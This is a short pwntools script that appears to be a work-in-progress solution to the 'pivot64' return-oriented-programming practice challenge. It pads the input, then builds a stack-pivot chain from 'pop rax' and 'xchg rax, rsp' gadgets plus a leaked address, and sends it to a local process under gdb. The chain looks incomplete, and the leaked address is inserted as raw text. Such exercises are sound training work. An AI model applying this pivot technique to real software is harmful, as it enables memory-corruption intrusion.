#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def main():
    global data
    context(arch="amd64", os="linux", endian="little")
#    context.log_level = "critical"
    e = ELF("./pivot64")
    rop1 = ROP([e])
    rop2 = ROP([e])

#    foothold_function = e.plt['foothold_function']
    pop_rax = rop2.find_gadget(["pop rax", "ret"])[0]
    xchg_rsp = 0x0000000000400b02                       # xchg rax, rsp ; ret

    rop1.raw("A"*256)

    p = process(['./pivot64'])
    msg = p.recv(timeout=0.1)
    print msg

    pivot_addr = msg[msg.find("0x"):]

    rop2.raw(rop2.generatePadding(0,39))
    rop2.raw(p64(pop_rax))
    rop2.raw(pivot_addr)
    rop2.raw(p64(xchg_rsp))

    p.send(str(rop1))
    msg = p.recv(timeout=0.1)
    print msg

    print "ROP = " +str(rop2)
    p.send(str(rop2))
    context.terminal = ["xterm", "-e", "sh", "-c"]
    gdb.attach(p)

    msg = p.recv(timeout=0.1)
    print msg
    p.close()


if __name__ == "__main__":
    main()
